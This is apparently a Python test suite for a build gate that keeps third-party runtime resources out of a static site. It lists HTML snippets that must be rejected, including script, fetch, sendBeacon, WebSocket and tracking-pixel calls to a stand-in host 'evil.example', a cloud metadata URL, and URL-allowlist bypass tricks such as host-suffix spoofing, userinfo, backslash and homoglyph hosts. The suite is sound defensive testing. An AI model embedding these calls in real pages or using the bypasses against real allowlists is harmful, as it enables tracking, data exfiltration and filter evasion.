#!/usr/bin/env python3
"""证明「无第三方运行时资源」门禁真的会拦住每一种向量。

红队第二轮指出原实现漏了 srcset / poster / iframe / new Image() / XHR；
验收报告进一步指出 `is_remote()` 用「整条 URL 是否包含白名单字符串」判断，
把 `https://github.com.evil.example/pixel.js`、`https://evil.example/?u=github.com`
误判成白名单。这里每一条「必须拒绝」的向量都**单独起一个真实子进程**
跑 `python tools/check_no_remote.py <临时 dist>` 并断言退出码 1 —— 不是只测
`is_remote()`，而是证明端到端真的失败、且输出里点名了那条 URL。
每条「必须允许」的向量同样跑整脚本并断言退出码 0，防止误杀。

运行：
  python -m unittest discover -s tests/logic -p 'test_*.py' -v
  python tests/logic/test_gate_no_remote.py
"""
from __future__ import annotations

import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
GATE = ROOT / "tools" / "check_no_remote.py"

sys.path.insert(0, str(ROOT / "tools"))
import check_no_remote  # noqa: E402


# ---------------------------------------------------------------------------
# 必须拒绝：每条都应让门禁 exit 1
# 三元组：(名称, 植入的 HTML, 门禁输出里必须出现的关键片段)
# ---------------------------------------------------------------------------
REJECT_VECTORS = [
    # --- 旧有 18 类，一条都不许减少 ---
    ("link preconnect", '<link rel="preconnect" href="//cdn.evil.example">', "//cdn.evil.example"),
    ("source srcset", '<source srcset="https://evil.example/a.webp 1x, https://evil.example/b.webp 2x">', "https://evil.example/a.webp"),
    ("img srcset", '<img srcset="https://evil.example/a.png 2x" src="./ok.png">', "https://evil.example/a.png"),
    ("video poster", '<video poster="https://evil.example/p.jpg"></video>', "https://evil.example/p.jpg"),
    ("iframe src", '<iframe src="https://evil.example/x"></iframe>', "https://evil.example/x"),
    ("embed src", '<embed src="https://evil.example/e.swf">', "https://evil.example/e.swf"),
    ("object data", '<object data="https://evil.example/o.svg"></object>', "https://evil.example/o.svg"),
    ("form action", '<form action="https://evil.example/submit"></form>', "https://evil.example/submit"),
    ("@import url()", '<style>@import url("https://evil.example/a.css");</style>', "https://evil.example/a.css"),
    ("@import bare", '<style>@import "https://evil.example/b.css";</style>', "https://evil.example/b.css"),
    ("css url()", '<style>body{background:url(https://evil.example/bg.png)}</style>', "https://evil.example/bg.png"),
    ("js fetch", '<script>fetch("https://evil.example/api")</script>', "https://evil.example/api"),
    ("js XHR", '<script>new XMLHttpRequest().open("GET","https://evil.example")</script>', "https://evil.example"),
    ("js Image.src", '<script>new Image().src="https://evil.example/t.gif"</script>', "https://evil.example/t.gif"),
    ("js sendBeacon", '<script>navigator.sendBeacon("https://evil.example/b")</script>', "https://evil.example/b"),
    ("js WebSocket", '<script>new WebSocket("wss://evil.example/ws")</script>', "wss://evil.example/ws"),
    ("js EventSource", '<script>new EventSource("https://evil.example/s")</script>', "https://evil.example/s"),
    ("js dynamic import", '<script>import("https://evil.example/m.js")</script>', "https://evil.example/m.js"),

    # --- 子串匹配时代的绕过：白名单字符串出现在 URL 任意位置都不算数 ---
    ("host 后缀伪装", '<script src="https://github.com.evil.example/pixel.js"></script>',
     "https://github.com.evil.example/pixel.js"),
    ("query 里塞白名单", '<img src="https://evil.example/?u=github.com">',
     "https://evil.example/?u=github.com"),
    ("本站域名前缀伪装", '<script src="https://tbj0623.github.io.evil.example/x.js"></script>',
     "https://tbj0623.github.io.evil.example/x.js"),
    ("127.0.0.1 后缀伪装", '<img src="http://127.0.0.1.evil.example/x.png">',
     "http://127.0.0.1.evil.example/x.png"),
    ("百分号编码点伪装", '<script src="https://github.com%2eevil.example/x.js"></script>',
     "https://github.com%2eevil.example/x.js"),

    # --- 协议 / netloc 解析类 ---
    ("协议相对", '<script src="//evil.example/x.js"></script>', "//evil.example/x.js"),
    ("userinfo 混淆", '<script src="https://github.com@evil.example/x.js"></script>',
     "https://github.com@evil.example/x.js"),
    ("反斜杠绕过", '<img src="https://evil.example\\@github.com/x.js">',
     "https://evil.example\\@github.com/x.js"),
    ("缺 // 的 https:", '<script src="https:github.com/x.js"></script>', "https:github.com/x.js"),
    ("https 三斜杠", '<script src="https:///github.com/x.js"></script>', "https:///github.com/x.js"),
    ("ftp scheme", '<script src="ftp://evil.example/x.js"></script>', "ftp://evil.example/x.js"),
    ("blob scheme", '<img src="blob:https://evil.example/0000-uuid">', "blob:https://evil.example/0000-uuid"),
    ("filesystem scheme", '<img src="filesystem:https://evil.example/temporary/x.png">',
     "filesystem:https://evil.example/temporary/x.png"),
    ("javascript scheme", '<script src="javascript:alert(1)"></script>', "javascript:alert(1)"),
    ("云元数据地址", '<img src="http://169.254.169.254/latest/meta-data/">',
     "http://169.254.169.254/latest/meta-data/"),

    # --- 控制字符 / 空白 / 同形字 / 尾点 ---
    ("制表符注入", '<img src="https://evil.example/x\t.png">', "https://evil.example/x"),
    ("换行注入", '<img src="https://evil.example/x\n.png">', "https://evil.example/x"),
    ("空格注入", '<img src="https://evil.example/ x.png">', "https://evil.example/"),
    ("Unicode 同形字主机", '<script src="https://g\u0456thub.com/x.js"></script>',
     "https://g\u0456thub.com/x.js"),
    ("尾点伪装主机", '<script src="https://github.com.evil.example./x.js"></script>',
     "https://github.com.evil.example./x.js"),
    ("大小写伪装", '<img src="HTTPS://GITHUB.COM.EVIL.EXAMPLE/x.png">',
     "HTTPS://GITHUB.COM.EVIL.EXAMPLE/x.png"),

    # --- 上下文区分：github.com 只允许出现在非取回类文档链接 ---
    ("github 用作 script src", '<script src="https://github.com/tbj0623/zero-dossier-office/app.mjs"></script>',
     "https://github.com/tbj0623/zero-dossier-office/app.mjs"),
    ("github 用作 img src", '<img src="https://github.com/tbj0623/zero-dossier-office/logo.png">',
     "https://github.com/tbj0623/zero-dossier-office/logo.png"),
    ("github 用作 form action", '<form action="https://github.com/submit"></form>',
     "https://github.com/submit"),
    ("github 用作 stylesheet", '<link rel="stylesheet" href="https://github.com/x.css">',
     "https://github.com/x.css"),
    ("github 用作 preload", '<link rel="preload" href="https://github.com/x.js" as="script">',
     "https://github.com/x.js"),
    ("github 用作 preconnect", '<link rel="preconnect" href="https://github.com">',
     "https://github.com"),
    ("docs.github 用作 stylesheet", '<link rel="stylesheet" href="https://docs.github.com/x.css">',
     "https://docs.github.com/x.css"),
    ("rel 缺失从严", '<link href="https://github.com/x">', "https://github.com/x"),
    ("rel 未知从严", '<link rel="noopener" href="https://github.com/x">', "https://github.com/x"),
    ("混合 rel 从严", '<link rel="alternate stylesheet" href="https://github.com/x.css">',
     "https://github.com/x.css"),
    ("文档 rel 但主机不在表内", '<link rel="alternate" href="https://evil.example/x">',
     "https://evil.example/x"),
    ("文档 rel 主机后缀伪装", '<link rel="canonical" href="https://github.com.evil.example/x">',
     "https://github.com.evil.example/x"),

    # --- 各个取回类 rel 都要拦 ---
    ("rel=stylesheet 协议相对", '<link rel="stylesheet" href="//evil.example/x.css">',
     "//evil.example/x.css"),
    ("rel=icon", '<link rel="icon" href="https://evil.example/i.png">', "https://evil.example/i.png"),
    ("rel=apple-touch-icon", '<link rel="apple-touch-icon" href="https://evil.example/i.png">',
     "https://evil.example/i.png"),
    ("rel=mask-icon", '<link rel="mask-icon" href="https://evil.example/i.svg">',
     "https://evil.example/i.svg"),
    ("rel=manifest", '<link rel="manifest" href="https://evil.example/m.webmanifest">',
     "https://evil.example/m.webmanifest"),
    ("rel=modulepreload", '<link rel="modulepreload" href="https://evil.example/m.js">',
     "https://evil.example/m.js"),
    ("rel=prefetch", '<link rel="prefetch" href="https://evil.example/p.html">',
     "https://evil.example/p.html"),
    ("rel=dns-prefetch", '<link rel="dns-prefetch" href="//evil.example">', "//evil.example"),
    ("rel=preconnect 大小写", '<link REL="PRELOAD" HREF="https://github.com/x.js">',
     "https://github.com/x.js"),

    # --- 无引号属性：旧正则要求属性值带引号，这些写法此前整个漏过 ---
    ("无引号 script src", "<script src=//evil.example/x.js></script>", "//evil.example/x.js"),
    ("无引号 img src", "<img src=https://evil.example/t.png>", "https://evil.example/t.png"),
    ("无引号 iframe src", "<iframe src=https://evil.example/f></iframe>", "https://evil.example/f"),
    ("无引号 srcset", "<img srcset=https://evil.example/a.png>", "https://evil.example/a.png"),
    ("无引号 form action", "<form action=https://evil.example/submit></form>",
     "https://evil.example/submit"),
    ("无引号 object data", "<object data=https://evil.example/o.svg></object>",
     "https://evil.example/o.svg"),
    ("无引号 + 白名单子串", "<script src=https://github.com.evil.example/x.js></script>",
     "https://github.com.evil.example/x.js"),
    ("无引号 + 单引号混排", "<script src='//evil.example/y.js'></script>", "//evil.example/y.js"),
]

# ---------------------------------------------------------------------------
# 必须允许：每条都应让门禁 exit 0
# ---------------------------------------------------------------------------
ALLOW_VECTORS = [
    # --- 旧有 7 类 ---
    ("相对路径", '<img src="./assets/x.webp" alt="">'),
    ("根相对", '<link rel="stylesheet" href="/styles/app.css">'),
    ("data URI", '<img src="data:image/svg+xml;base64,AAAA" alt="">'),
    ("锚点", '<a href="#/cabinet">go</a>'),
    ("同源绝对", '<a href="https://tbj0623.github.io/zero-dossier-office/">site</a>'),
    ("w3 命名空间", '<svg xmlns="http://www.w3.org/2000/svg"></svg>'),
    ("许可证链接", '<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC</a>'),

    # --- 自家站点：所有取回类上下文都必须放行 ---
    ("本站 script", '<script src="https://tbj0623.github.io/zero-dossier-office/app.mjs"></script>'),
    ("本站 stylesheet", '<link rel="stylesheet" href="https://tbj0623.github.io/zero-dossier-office/styles/app.css">'),
    ("本站 img", '<img src="https://tbj0623.github.io/zero-dossier-office/assets/x.png">'),
    ("本站 srcset", '<img srcset="https://tbj0623.github.io/zero-dossier-office/assets/x.png 1x">'),
    ("本站 preconnect", '<link rel="preconnect" href="https://tbj0623.github.io">'),
    ("本站尾点", '<img src="https://tbj0623.github.io./zero-dossier-office/assets/x.png">'),

    # --- canonical / og:image 的绝对 URL ---
    ("canonical 本站", '<link rel="canonical" href="https://tbj0623.github.io/zero-dossier-office/">'),
    ("og:image 本站", '<meta property="og:image" content="https://tbj0623.github.io/zero-dossier-office/assets/cover.png">'),

    # --- 本地预览 ---
    ("127.0.0.1 带端口", '<img src="http://127.0.0.1:8080/x.png">'),
    ("localhost 带端口", '<script src="http://localhost:8080/app.mjs"></script>'),
    ("127.0.0.1 无端口", '<link rel="stylesheet" href="http://127.0.0.1/x.css">'),

    # --- data: 与各种相对写法 ---
    ("data:image/png", '<img src="data:image/png;base64,AAAA" alt="">'),
    ("CSS 里的 data URI", '<style>body{background:url(data:image/png;base64,AAAA)}</style>'),
    ("无 ./ 的相对路径", '<img src="assets/x.webp" alt="">'),
    ("根相对图片", '<img src="/x.png" alt="">'),
    ("相对 srcset", '<img srcset="./assets/x.png 1x, ./assets/x@2x.png 2x" src="./assets/x.png">'),
    ("锚点 stylesheet", '<link rel="stylesheet" href="#hash">'),

    # --- 非取回类上下文：文档主机可以出现 ---
    ("github rel=author", '<link rel="author" href="https://github.com/tbj0623/zero-dossier-office">'),
    ("github rel=me", '<link rel="me" href="https://github.com/tbj0623/zero-dossier-office">'),
    ("github rel=license", '<link rel="license" href="https://github.com/tbj0623/zero-dossier-office/blob/main/LICENSE">'),
    ("github rel=canonical", '<link rel="canonical" href="https://github.com/tbj0623/zero-dossier-office">'),
    ("github 尾点规范化", '<link rel="canonical" href="https://github.com./tbj0623/zero-dossier-office">'),
    ("docs.github rel=help", '<link rel="help" href="https://docs.github.com/articles">'),
    ("creativecommons rel=license", '<link rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">'),
    ("www.creativecommons rel=license", '<link rel="license" href="https://www.creativecommons.org/licenses/by-nc-sa/4.0/">'),
    ("w3.org rel=help", '<link rel="help" href="https://www.w3.org/TR/WCAG21/">'),
    ("schema.org rel=alternate", '<link rel="alternate" href="https://schema.org/VideoGame">'),
    ("itch.io rel=me", '<link rel="me" href="https://itch.io/">'),
    ("tbj0623.itch.io rel=me", '<link rel="me" href="https://tbj0623.itch.io/zero-dossier-office">'),

    # --- <link rel> 解析：大小写不敏感 / href-rel 顺序任意 / 多 token ---
    ("rel 属性大写", '<link REL="Canonical" HREF="https://github.com/tbj0623/zero-dossier-office">'),
    ("href 在 rel 之前", '<link href="https://github.com/tbj0623/zero-dossier-office" rel="canonical">'),
    ("多个文档 token", '<link rel="canonical alternate" href="https://tbj0623.github.io/zero-dossier-office/">'),
    ("单引号属性", "<link rel='canonical' href='https://github.com/tbj0623/zero-dossier-office'>"),

    # --- form action 取回类，但同源允许 ---
    ("同源 form action", '<form action="http://127.0.0.1:8080/submit"></form>'),

    # --- 普通外链（<a> 不是运行时取回）---
    ("github 仓库外链", '<a href="https://github.com/tbj0623/zero-dossier-office">repo</a>'),

    # --- 无引号属性：同源 / 相对路径不得误杀 ---
    ("无引号相对路径", "<img src=./assets/x.webp alt=''>"),
    ("无引号同源绝对", "<script src=https://tbj0623.github.io/zero-dossier-office/app.mjs></script>"),
    ("无引号本机端口", "<img src=http://127.0.0.1:8080/x.png>"),
]


def run_gate(dist: Path) -> tuple[int, str]:
    """起真实子进程跑门禁，返回 (退出码, stdout+stderr)。"""
    env = dict(os.environ)
    # 子进程输出统一 UTF-8，避免 Windows 默认 cp936 导致断言文本对不上
    env["PYTHONUTF8"] = "1"
    env["PYTHONIOENCODING"] = "utf-8"
    r = subprocess.run(
        [sys.executable, str(GATE), str(dist)],
        capture_output=True, text=True, encoding="utf-8", errors="replace", env=env,
    )
    return r.returncode, (r.stdout or "") + (r.stderr or "")


class GateVectorTests(unittest.TestCase):
    """每条向量都在独立的临时 dist 里跑整脚本，证明端到端行为。"""

    @classmethod
    def setUpClass(cls):
        cls._tmp = tempfile.TemporaryDirectory()
        cls.dist = Path(cls._tmp.name) / "dist"
        cls.dist.mkdir()
        cls.probe = cls.dist / "probe.html"

    @classmethod
    def tearDownClass(cls):
        cls._tmp.cleanup()

    def test_reject_vectors_exit_1(self):
        """必须拒绝：exit 1，且输出点名该 URL。"""
        for name, html, marker in REJECT_VECTORS:
            with self.subTest(vector=name):
                self.probe.write_text(html, encoding="utf-8")
                code, out = run_gate(self.dist)
                self.assertEqual(
                    1, code,
                    f"漏过：{name}\n  HTML={html!r}\n  门禁输出={out!r}",
                )
                self.assertIn(
                    marker, out,
                    f"{name}：门禁 exit 1 但输出里没有 {marker!r}\n  输出={out!r}",
                )

    def test_allow_vectors_exit_0(self):
        """必须允许：exit 0，不得误杀。"""
        for name, html in ALLOW_VECTORS:
            with self.subTest(vector=name):
                self.probe.write_text(html, encoding="utf-8")
                code, out = run_gate(self.dist)
                self.assertEqual(
                    0, code,
                    f"误杀：{name}\n  HTML={html!r}\n  门禁输出={out!r}",
                )

    def test_real_dist_clean(self):
        """真实 dist 也必须干净（确保新规则不误杀构建产物）。"""
        real = ROOT / "dist"
        if not real.is_dir():
            self.skipTest("dist 不存在（尚未构建）")
        code, out = run_gate(real)
        self.assertEqual(0, code, f"真实 dist 未通过：{out!r}")


class HostMatcherTests(unittest.TestCase):
    """is_remote() 的主机名判定（函数级，补足端到端之外的可读性）。"""

    def test_exact_host_only(self):
        for url in (
            "https://github.com.evil.example/x.js",
            "https://evil.example/?u=github.com",
            "https://tbj0623.github.io.evil.example/x.js",
            "http://127.0.0.1.evil.example/x",
        ):
            with self.subTest(url=url):
                self.assertTrue(check_no_remote.is_remote(url, fetching=True))
                self.assertTrue(check_no_remote.is_remote(url, fetching=False))

    def test_doc_hosts_only_in_non_fetching_context(self):
        urls = (
            "https://github.com/tbj0623/zero-dossier-office",
            "https://docs.github.com/x",
            "https://creativecommons.org/licenses/by-nc-sa/4.0/",
            "https://www.creativecommons.org/x",
            "https://www.w3.org/TR/WCAG21/",
            "https://schema.org/VideoGame",
            "https://itch.io/",
            "https://tbj0623.itch.io/zero-dossier-office",
        )
        for url in urls:
            with self.subTest(url=url):
                self.assertTrue(check_no_remote.is_remote(url, fetching=True))
                self.assertFalse(check_no_remote.is_remote(url, fetching=False))

    def test_trailing_dot(self):
        self.assertFalse(check_no_remote.is_remote("https://github.com./x", fetching=False))
        self.assertFalse(check_no_remote.is_remote("https://tbj0623.github.io./x", fetching=True))
        self.assertTrue(check_no_remote.is_remote("https://github.com.evil.example./x", fetching=False))
        self.assertTrue(check_no_remote.is_remote("https://github.com../x", fetching=False))
        self.assertTrue(check_no_remote.is_remote("https://evil.example./x", fetching=True))

    def test_backslash_and_scheme_edge_cases(self):
        self.assertTrue(check_no_remote.is_remote("https://evil.example\\@github.com/x.js"))
        self.assertTrue(check_no_remote.is_remote("https:github.com/x.js"))
        self.assertTrue(check_no_remote.is_remote("https:///github.com/x.js"))
        self.assertTrue(check_no_remote.is_remote("//evil.example/x"))
        self.assertTrue(check_no_remote.is_remote("//127.0.0.1/x"))
        self.assertTrue(check_no_remote.is_remote("wss://evil.example/s"))
        self.assertTrue(check_no_remote.is_remote("ftp://evil.example/x"))
        self.assertTrue(check_no_remote.is_remote("blob:https://evil.example/u"))
        self.assertTrue(check_no_remote.is_remote("filesystem:https://evil.example/temporary/x"))
        self.assertTrue(check_no_remote.is_remote("https://github.com@evil.example/x"))
        self.assertTrue(check_no_remote.is_remote("https://github.com:99999/x", fetching=False))

    def test_unicode_and_control_chars(self):
        self.assertTrue(check_no_remote.is_remote("https://g\u0456thub.com/x.js", fetching=False))
        self.assertTrue(check_no_remote.is_remote("https://evil.example/x\t.png"))
        self.assertTrue(check_no_remote.is_remote("https://evil.example/x\n.png"))
        self.assertTrue(check_no_remote.is_remote("https://evil.example/ x.png"))
        self.assertTrue(check_no_remote.is_remote("https://github.com%2eevil.example/x"))

    def test_relative_and_data_allowed(self):
        for url in (
            "./assets/x.webp",
            "assets/x.webp",
            "/x",
            "#hash",
            "?u=github.com",
            "data:image/png;base64,AAAA",
            "http://127.0.0.1:8080/x",
            "http://localhost:8080/x",
            "https://tbj0623.github.io/zero-dossier-office/assets/x.png",
        ):
            with self.subTest(url=url):
                self.assertFalse(check_no_remote.is_remote(url, fetching=True))
        self.assertFalse(check_no_remote.is_remote("", fetching=True))

    def test_link_rel_parsing(self):
        non_fetching = check_no_remote._link_is_non_fetching
        self.assertTrue(non_fetching("canonical"))
        self.assertTrue(non_fetching("  Canonical  "))
        self.assertTrue(non_fetching("canonical alternate"))
        self.assertFalse(non_fetching(None))
        self.assertFalse(non_fetching(""))
        self.assertFalse(non_fetching("   "))
        self.assertFalse(non_fetching("stylesheet"))
        self.assertFalse(non_fetching("alternate stylesheet"))
        self.assertFalse(non_fetching("preload"))
        self.assertFalse(non_fetching("noopener"))


def main() -> int:
    suite = unittest.defaultTestLoader.loadTestsFromModule(sys.modules[__name__])
    result = unittest.TextTestRunner(verbosity=2, stream=sys.stdout).run(suite)
    print(f"必须拒绝向量（每条独立子进程，要求 exit 1）：{len(REJECT_VECTORS)} 条")
    print(f"必须允许向量（每条独立子进程，要求 exit 0）：{len(ALLOW_VECTORS)} 条")
    if not result.wasSuccessful():
        print("FAIL 有向量漏过或被误杀，见上方失败项")
        return 1
    print("PASS 门禁对全部已知向量有效，且不误杀合法写法")
    return 0


if __name__ == "__main__":
    sys.exit(main())
